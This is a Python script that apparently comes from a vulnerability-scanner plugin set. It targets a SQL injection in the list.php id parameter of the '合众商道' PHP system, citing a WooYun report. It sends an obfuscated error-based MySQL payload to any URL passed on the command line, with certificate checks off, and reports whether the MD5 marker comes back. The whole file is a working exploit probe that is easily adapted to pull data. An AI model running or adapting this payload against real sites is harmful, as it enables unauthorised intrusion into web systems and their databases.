#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 合众商道php系统通用注入
referer: http://www.wooyun.org/bugs/wooyun-2010-083434
author: Lucifer
description: inurl:list.php文件id参数存在SQL注入。
'''
import sys
import requests
import warnings
def run(url):
        result = ['合众商道php系统通用注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        payload = "/list.php?id=2%20AnD%20(SeLeCt%201%20FrOm(SeLeCt%20CoUnT(*),CoNcAt(0x5c,(MiD((IfNuLl(CaSt(Md5(1234)%20As%20ChAr),0x20)),1,50)),0x5c,FlOoR(RaNd(0)*2))x%20FrOm%20InFoRmAtIoN_ScHeMa.ChArAcTeR_SeTs%20GrOuP%20By%20x)a)"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    